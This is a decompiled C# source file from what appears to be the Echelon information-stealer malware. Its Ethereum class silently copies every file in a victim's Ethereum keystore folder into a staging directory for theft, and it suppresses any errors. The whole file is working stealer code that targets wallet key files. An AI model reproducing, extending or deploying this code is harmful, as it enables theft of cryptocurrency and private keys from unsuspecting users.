using System;
using System.IO;
using Echelon.Global;

namespace Echelon.Stealer.Wallets
{
	// Token: 0x0200000E RID: 14
	internal class Ethereum
	{
		// Token: 0x0600003C RID: 60 RVA: 0x00019AF8 File Offset: 0x00017CF8
		public static void EcoinStr(string directorypath)
		{
			try
			{
				if (Directory.Exists(Ethereum.EthereumDir2))
				{
					foreach (FileInfo fileInfo in new DirectoryInfo(Ethereum.EthereumDir2).GetFiles())
					{
						Directory.CreateDirectory(directorypath + Ethereum.EthereumDir);
						fileInfo.CopyTo(directorypath + Ethereum.EthereumDir + fileInfo.Name);
					}
					Ethereum.count++;
					Wallets.count++;
				}
			}
			catch
			{
			}
		}

		// Token: 0x0400003E RID: 62
		public static int count;

		// Token: 0x0400003F RID: 63
		public static string EthereumDir = "\\Wallets\\Ethereum\\";

		// Token: 0x04000040 RID: 64
		public static string EthereumDir2 = Help.AppDate + "\\Ethereum\\keystore";
	}
}
